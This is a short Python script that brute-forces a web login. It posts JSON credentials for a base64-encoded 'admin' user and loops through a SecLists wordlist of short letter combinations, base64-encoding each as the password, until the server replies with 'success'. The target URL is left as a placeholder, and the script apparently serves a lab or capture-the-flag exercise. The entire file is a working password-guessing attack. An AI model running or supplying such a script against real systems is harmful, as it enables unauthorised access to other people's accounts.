###### 1/18/2021
# Simple post script

import requests
import base64
import json

url = 'URL HERE'
data = {}
passw = '' #Dynamic JSON value
myjson = {"user":"YWRtaW4=","pass":"None"}


#x = requests.post(url, json = myjson)

#print(x.text)

file = open("/usr/share/SecLists/Fuzzing/1-4_all_letters_a-z.txt", "r+")
for i in file:
	message = i.rstrip()
	message_bytes = message.encode('ascii')
	base64_bytes = base64.b64encode(message_bytes)
	base64_message = base64_bytes.decode('ascii')
	passw = base64_message
	myjson["pass"] = passw
	x = requests.post(url, json = myjson)
	if "success" in x.text:
		print(x.text)
		quit()
	else:
		print(x.text)



